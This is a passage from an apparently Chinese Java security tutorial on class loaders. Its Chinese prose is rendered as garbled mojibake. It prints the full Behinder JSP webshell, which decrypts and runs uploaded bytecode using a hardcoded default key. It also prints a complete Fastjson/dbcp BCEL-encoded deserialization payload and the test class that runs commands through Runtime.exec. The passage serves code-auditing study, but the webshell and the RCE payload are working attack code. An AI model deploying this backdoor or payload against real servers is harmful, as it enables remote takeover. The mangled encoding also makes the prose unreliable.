åé—¨åˆ©ç”¨çš„å°±æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å®ç°çš„ï¼Œå†°èçš„å®¢æˆ·ç«¯ä¼šå°†å¾…æ‰§è¡Œçš„å‘½ä»¤æˆ–ä»£ç ç‰‡æ®µé€šè¿‡åŠ¨æ€ç¼–è¯‘æˆç±»å­—èŠ‚ç å¹¶åŠ å¯†åä¼ åˆ°å†°èçš„ JSP åé—¨ï¼Œåé—¨ä¼šç»è¿‡ AES è§£å¯†å¾—åˆ°ä¸€ä¸ªéšæœºç±»åçš„ç±»å­—èŠ‚ç ï¼Œç„¶åè°ƒç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½ï¼Œæœ€ç»ˆé€šè¿‡è¯¥ç±»é‡å†™çš„ <code>equals</code> æ–¹æ³•å®ç°æ¶æ„æ”»å‡»ï¼Œå…¶ä¸­ <code>equals</code> æ–¹æ³•ä¼ å…¥çš„ <code>pageContext</code> å¯¹è±¡æ˜¯ä¸ºäº†ä¾¿äºè·å–åˆ°è¯·æ±‚å’Œå“åº”å¯¹è±¡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å†°èçš„å‘½ä»¤æ‰§è¡Œç­‰å‚æ•°ä¸ä¼šä»è¯·æ±‚ä¸­è·å–ï¼Œè€Œæ˜¯ç›´æ¥æ’å…¥åˆ°äº†ç±»æˆå‘˜å˜é‡ä¸­</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token annotation punctuation">@page</span> <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name">U</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">super</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token class-name">String</span> k <span class="token operator">=</span> <span class="token string">"e45e329feb5d925b"</span><span class="token punctuation">;</span><span class="token comment">/* è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç  32 ä½ md5 å€¼çš„å‰ 16 ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç  rebeyond*/</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        session<span class="token punctuation">.</span><span class="token function">putValue</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token class-name">Cipher</span> c <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">new</span> <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">g</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr></table></figure><h1 id="bcel-classloader"><a class="anchor" href="#bcel-classloader">#</a> BCEL ClassLoader</h1><p><span class="exturl" data-url="aHR0cHM6Ly9jb21tb25zLmFwYWNoZS5vcmcvcHJvcGVyL2NvbW1vbnMtYmNlbC8=">BCEL</span>ï¼ˆ <code>Apache Commons BCELâ„¢</code> ï¼‰æ˜¯ä¸€ä¸ªç”¨äºåˆ†æã€åˆ›å»ºå’Œæ“çºµ Java ç±»æ–‡ä»¶çš„å·¥å…·åº“ï¼ŒOracle JDK å¼•ç”¨äº† BCEL åº“ï¼Œä¸è¿‡ä¿®æ”¹äº†åŸåŒ…å <code>org.apache.bcel.util.ClassLoader</code> ä¸º <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> ï¼ŒBCEL çš„ç±»åŠ è½½å™¨åœ¨è§£æç±»åæ—¶ä¼šå¯¹ ClassName ä¸­æœ‰ <code>$$BCEL$$</code> æ ‡è¯†çš„ç±»åšç‰¹æ®Šå¤„ç†ï¼Œè¯¥ç‰¹æ€§ç»å¸¸è¢«ç”¨äºç¼–å†™å„ç±»æ”»å‡» Payloadã€‚</p><h2 id="bcel-æ”»å‡»åŸç†"><a class="anchor" href="#bcel-æ”»å‡»åŸç†">#</a> BCEL æ”»å‡»åŸç†</h2><p>å½“ BCEL çš„ <code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code> åŠ è½½ä¸€ä¸ªç±»åä¸­å¸¦æœ‰ <code>$$BCEL$$</code> çš„ç±»æ—¶ä¼šæˆªå–å‡º <code>$$BCEL$$</code> åé¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ <code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code> å°†å­—ç¬¦ä¸²è§£ææˆç±»å­—èŠ‚ç ï¼ˆå¸¦æœ‰æ”»å‡»ä»£ç çš„æ¶æ„ç±»ï¼‰ï¼Œæœ€åä¼šè°ƒç”¨ <code>defineClass</code> æ³¨å†Œè§£ç åçš„ç±»ï¼Œä¸€æ—¦è¯¥ç±»è¢«åŠ è½½å°±ä¼šè§¦å‘ç±»ä¸­çš„æ¶æ„ä»£ç ï¼Œæ­£æ˜¯å› ä¸º BCEL æœ‰äº†è¿™ä¸ªç‰¹æ€§ï¼Œæ‰å¾—ä»¥è¢«å¹¿æ³›çš„åº”ç”¨äºå„ç±»æ”»å‡» Payload ä¸­ã€‚</p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716164712318.png" title="image-20230716164712318"></p><h2 id="bcel-ç¼–è§£ç "><a class="anchor" href="#bcel-ç¼–è§£ç ">#</a> BCEL ç¼–è§£ç </h2><p><strong>BCEL ç¼–ç </strong></p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">CLASS_BYTES</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>ç±»å­—èŠ‚ç <span class="token keyword">byte</span>æ•°ç»„<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// BCEL ç¼–ç ç±»å­—èŠ‚ç </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span>Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token constant">CLASS_BYTES</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>ç¼–ç åçš„ç±»åï¼š$$BCEL$$$l<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mi>b</mi></mrow><annotation encoding="application/x-tex">8b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord">8</span><span class="mord mathnormal">b</span></span></span></span>I<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal">A</span></span></span></span>A<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal">A</span></span></span></span>A<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal">A</span></span></span></span>A$A<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>85</mn><mi>S</mi></mrow><annotation encoding="application/x-tex">85S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord">8</span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:.05764em">S</span></span></span></span>dbn$d......ï¼ŒBCEL ä¼šå¯¹ç±»å­—èŠ‚ç è¿›è¡Œç¼–ç </p><p><strong>BCEL è§£ç </strong></p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span>    index    <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">String</span> realName <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// BCEL è§£ç ç±»å­—èŠ‚ç </span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span>Utility</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>realName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>å¦‚æœè¢«åŠ è½½çš„ç±»åä¸­åŒ…å«äº† <code>$$BCEL$$</code> å…³é”®å­—ï¼ŒBCEL å°±ä¼šä½¿ç”¨ç‰¹æ®Šçš„æ–¹å¼è¿›è¡Œè§£ç å¹¶åŠ è½½è§£ç ä¹‹åçš„ç±»ã€‚</p><p><strong>BCEL å…¼å®¹æ€§é—®é¢˜</strong></p><p>BCEL è¿™ä¸ªç‰¹æ€§ä»…é€‚ç”¨äº BCEL 6.0 ä»¥ä¸‹ï¼Œå› ä¸ºä» 6.0 å¼€å§‹ <code>org.apache.bcel.classfile.ConstantUtf8#setBytes</code> å°±å·²ç»è¿‡æ—¶äº†</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">/**</span></pre></td></tr><tr><td data-num="2"></td><td><pre>* @param bytes the raw bytes of this Utf-8</pre></td></tr><tr><td data-num="3"></td><td><pre>* @deprecated (since 6.0)</pre></td></tr><tr><td data-num="4"></td><td><pre>*/</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token annotation punctuation">@java.lang.Deprecated</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">setBytes</span><span class="token punctuation">(</span> <span class="token keyword">final</span> <span class="token class-name">String</span> bytes <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Oracle è‡ªå¸¦çš„ BCEL æ˜¯ä¿®æ”¹äº†åŸå§‹çš„åŒ…åï¼Œå› æ­¤ä¹Ÿæœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œå·²çŸ¥æ”¯æŒè¯¥ç‰¹æ€§çš„ JDK ç‰ˆæœ¬ä¸ºï¼š <code>JDK1.5 - 1.7</code> ã€ <code>JDK8 - JDK8u241</code> ã€ <code>JDK9</code></p><p><strong>BCEL FastJson æ”»å‡»é“¾åˆ†æ</strong></p><p>Fastjsonï¼ˆ1.1.15 - 1.2.4ï¼‰å¯ä»¥ä½¿ç”¨å…¶ä¸­æœ‰ä¸ª dbcp çš„ Payload å°±æ˜¯åˆ©ç”¨äº† BCEL æ”»å‡»é“¾ï¼Œåˆ©ç”¨ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.dbcp.BasicDataSource"</span><span class="token punctuation">,</span><span class="token string">"driverClassName"</span><span class="token operator">:</span><span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A"</span><span class="token punctuation">,</span><span class="token string">"driverClassLoader"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.bcel.util.ClassLoader"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>FastJson è‡ªåŠ¨è°ƒç”¨ setter æ–¹æ³•ä¿®æ”¹ <code>org.apache.commons.dbcp.BasicDataSource</code> ç±»çš„ <code>driverClassName</code> å’Œ <code>driverClassLoader</code> å€¼ï¼Œ <code>driverClassName</code> æ˜¯ç»è¿‡ BCEL ç¼–ç åçš„ <code>com.anbai.sec.classloader.TestBCELClass</code> ç±»å­—èŠ‚ç ï¼Œ <code>driverClassLoader</code> æ˜¯ä¸€ä¸ªç”± FastJson åˆ›å»ºçš„ <code>org.apache.bcel.util.ClassLoader</code> å®ä¾‹</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestBCELClass</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"open -a Calculator.app"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token class-name">String</span> osName  <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>osName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"Windows"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            command <span class="token operator">=</span> <span class="token string">"calc 12345678901234567"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>osName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"Linux"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            command <span class="token operator">=</span> <span class="token string">"curl localhost:9999/"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="xalan-classloader"><a class="anchor" href="#xalan-classloader">#</a> Xalan ClassLoader</h1><p>Xalan å’Œ BCEL ä¸€æ ·éƒ½ç»å¸¸è¢«ç”¨äºç¼–å†™ååºåˆ—åŒ– Payloadï¼ŒOracle JDK é»˜è®¤ä¹Ÿå¼•ç”¨äº† Xalanï¼ŒåŒæ—¶ä¿®æ”¹äº†åŸåŒ…å <code>org.apache.xalan.xsltc.trax.TemplatesImpl</code> ä¸º <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> ï¼ŒXalan æœ€å¤§çš„ç‰¹ç‚¹æ˜¯å¯ä»¥ä¼ å…¥ç±»å­—èŠ‚ç å¹¶åˆå§‹åŒ–ï¼ˆéœ€è¦è°ƒç”¨ <code>getOutputProperties</code> æ–¹æ³•ï¼‰ï¼Œä»è€Œå®ç° RCEï¼Œæ¯”å¦‚ Fastjson å’Œ Jackson ä¼šä½¿ç”¨åå°„è°ƒç”¨ <code>getter/setter</code> æˆ– <code>æˆå‘˜å˜é‡æ˜ å°„</code> çš„æ–¹å¼å®ç° JSON ååºåˆ—åŒ–</p><p><code>TemplatesImpl</code> ä¸­æœ‰ä¸€ä¸ª <code>_bytecodes</code> æˆå‘˜å˜é‡ï¼Œç”¨äºå­˜å‚¨ç±»å­—èŠ‚ç ï¼Œé€šè¿‡ JSON ååºåˆ—åŒ–çš„æ–¹å¼å¯ä»¥ä¿®æ”¹è¯¥å˜é‡å€¼ï¼Œä½†å› ä¸ºè¯¥æˆå‘˜å˜é‡æ²¡æœ‰å¯æ˜ å°„çš„ get/set æ–¹æ³•æ‰€ä»¥éœ€è¦ä¿®æ”¹ JSON åº“çš„è™šæ‹ŸåŒ–é…ç½®ï¼Œæ¯”å¦‚ Fastjson è§£ææ—¶å¿…é¡»å¯ç”¨ <code>Feature.SupportNonPublicField</code> ã€Jackson å¿…é¡»å¼€å¯ <code>JacksonPolymorphicDeserialization</code> ï¼ˆè°ƒç”¨ <code>mapper.enableDefaultTyping()</code> ï¼‰ï¼Œæ‰€ä»¥åˆ©ç”¨æ¡ä»¶ç›¸å¯¹è¾ƒé«˜</p><p><code>ClassLoader</code> æ˜¯ JVM ä¸­ä¸€ä¸ªéå¸¸é‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œ <code>ClassLoader</code> å¯ä»¥ä¸ºæˆ‘ä»¬åŠ è½½ä»»æ„çš„ java ç±»ï¼Œé€šè¿‡è‡ªå®šä¹‰ <code>ClassLoader</code> æ›´èƒ½å¤Ÿå®ç°è‡ªå®šä¹‰ç±»åŠ è½½è¡Œä¸ºï¼Œåœ¨åé¢çš„å‡ ä¸ªç« èŠ‚æˆ‘ä»¬ä¹Ÿå°†è®²è§£ <code>ClassLoader</code> çš„å®é™…åˆ©ç”¨åœºæ™¯</p><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Javaä»£ç å®¡è®¡</a> <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="tag"><i class="ic i-tag"></i> Javaå®‰å…¨åŸºç¡€ç¯‡</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="ä½™æ˜Ÿé…’ å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="ä½™æ˜Ÿé…’ æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div><div><img data-src="/images/paypal.png" alt="ä½™æ˜Ÿé…’ è´å®"><p>è´å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>ä½™æ˜Ÿé…’ <i class="ic i-at"><em>@</em></i>ä½™æ˜Ÿé…’</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="1. javaç±»åŠ è½½æœºåˆ¶">http://example.com/APT/ä»£ç å®¡è®¡/Javaä»£ç 